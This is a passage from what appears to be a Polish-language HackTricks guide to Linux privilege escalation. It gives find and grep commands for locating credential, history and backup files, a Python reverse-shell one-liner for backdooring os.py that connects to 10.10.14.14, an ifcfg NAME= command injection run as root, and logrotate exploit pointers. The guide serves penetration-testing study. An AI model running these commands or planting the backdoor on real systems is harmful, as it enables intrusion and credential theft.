do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające passwords

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on przeszukuje **wiele możliwych plików, które mogą zawierać passwords**.\
**Innym interesującym narzędziem**, którego możesz użyć w tym celu, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania dużej ilości passwords przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logs

Jeśli potrafisz czytać logs, możesz znaleźć w nich interesujące/poufne informacje. Im dziwniejszy log, tym prawdopodobnie bardziej interesujący.\
Ponadto niektóre źle skonfigurowane (backdoored?) audit logs mogą pozwolić na zarejestrowanie passwords w audit logs, jak wyjaśniono w tym poście: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie naprawdę pomocna.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś też sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **zawartości**, a także wyszukać IP i adresy e‑mail w logach oraz hashe przy użyciu regexpów.\
Nie będę tu wypisywać, jak to wszystko zrobić, ale jeśli Cię to interesuje możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Luka w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** w pliku logu lub w jego katalogach nadrzędnych potencjalnie uzyskać podwyższone uprawnienia. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może być zmanipulowany, by wykonać dowolne pliki, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale też we wszystkich katalogach, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy `logrotate` w wersji `3.18.0` i starszych

Bardziej szczegółowe informacje o luce można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę lukę przy pomocy [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc zawsze gdy możesz modyfikować logi, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia, zastępując logi symlinkami.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik może **zapisać** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** może **zmodyfikować** istniejący, to twój **system is pwned**.

Skrypty sieciowe, na przykład _ifcg-eth0_, służą do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są \~sourced\~ w Linuksie przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli w nazwie występuje **spacja**, system próbuje wykonać część po spacji. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd, and rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Zawiera skrypty do `start`, `stop`, `restart`, a czasami `reload` usług. Mogą być one uruchamiane bezpośrednio lub przez linki symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywną ścieżką w systemach Redhat jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, używającym plików konfiguracyjnych do zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart ze względu na warstwę kompatybilności w Upstart.

**systemd** wyłania się jako nowoczesny init i menedżer usług, oferując zaawansowane funkcje takie jak uruchamianie demonów na żądanie, zarządzanie automontażami i migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych i `/etc/systemd/system/` dla modyfikacji administratora, upraszczając administrację systemem.

## Inne sztuczki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Frameworki rootujące Androida często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w przestrzeni użytkownika. Słabe uwierzytelnianie menedżera (np. sprawdzanie sygnatur bazujące na kolejności FD lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod menedżera i eskalację do root na urządzeniach już zrootowanych. Dowiedz się więcej oraz szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Mechanizmy zabezpieczeń jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najlepsze narzędzie do wyszukiwania Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Źródła

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
